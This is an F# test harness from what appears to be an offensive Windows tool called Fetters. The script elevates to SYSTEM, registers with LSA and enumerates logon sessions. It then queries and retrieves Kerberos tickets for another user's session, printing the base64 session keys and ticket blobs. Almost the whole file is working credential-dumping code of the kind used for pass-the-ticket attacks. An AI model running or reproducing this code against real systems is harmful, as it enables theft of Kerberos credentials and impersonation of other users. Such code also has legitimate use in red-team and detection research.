open System
open System.Security.Principal
open System.Runtime.InteropServices

open Fetters.DomainTypes 
open Fetters.NI.Providers
open Fetters.WMI.Providers
open Fetters.dotNetFunctions


// Testing/rework harness
printfn "%s" <| getSystem()
let lsaHandle = registerLsaLogonProcess ()
revertToSelf () |> ignore
let count, ptr = enumerateLsaLogonSessions () 
let sessions = getLsaSessionData (count, ptr)
printfn "Number of Sessions: %i" sessions.Length
let authpkg_ = sessions
                |> List.map(fun _x -> _x.loginID.lower, _x.loginID.upper)
printfn "Number of AuthPkgs: %i" authpkg_.Length


let LSAStringQuery = LSA_STRING_IN(length = uint16("kerberos".Length), maxLength = uint16("kerberos".Length + 1), buffer = "kerberos")

let authpkg = lookupLsaAuthenticationPackage lsaHandle LSAStringQuery

let _bogusLUID = LUID(lower = fst authpkg_.[1], upper = snd authpkg_.[1])
let kerbquery = 
    KERB_QUERY_TKT_CACHE_REQUEST(messageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage, 
                                    logonID = _bogusLUID)

let kerbretrieve = 
    KERB_RETRIEVE_TKT_REQUEST(messageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveTicketMessage,
                              logonID = _bogusLUID,
                              cacheOptions = KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED)

let intauth = authpkg |> fun (LsaAuthPackage authpkg) -> authpkg


let kerbresponse = getKerberosTicketResponse lsaHandle authpkg (kerbquery |> KERB_QUERY_TKT_CACHE_REQ)
let wrappedticketlist = extractKerberosReponseTickets kerbresponse
printfn "number of extracted tickets: %i" <| wrappedticketlist.Length

wrappedticketlist 
|> List.map(fun _t -> match _t with
                      |KERB_TKT_CACHE_INFO _t -> _t
                      |_ -> KERB_TICKET_CACHE_INFO())
|> List.map(fun _ticket -> createKerberosQueryTicket _ticket)
|> List.iter(fun item -> printfn "%s::%s::%A::%A::%s"   item.serverName 
                                                            item.realm 
                                                            item.startTime 
                                                            item.endTime
                                                            item.encryptionType)


let retrieveresponse = getKerberosTicketResponse lsaHandle authpkg (kerbretrieve |> KERB_RETRIEVE_TKT_REQ)
let wrappedretrieved = extractKerberosReponseTickets retrieveresponse
printfn "number of extracted tickets: %i" <| wrappedretrieved.Length

wrappedretrieved
|> List.map(fun tik ->  match tik with
                        |KERB_EXTERNAL_TKT _t -> _t
                        |_ -> KERB_EXTERNAL_TICKET() )
|> List.map(fun tik -> createKerberosRetrieveTicket tik)
|> List.iter(fun ticket -> printfn "%s::::%s::::%s::::%s"   ticket.serviceName
                                                ticket.domain
                                                ticket.base64SessionKey
                                                ticket.base64EncodedTicket)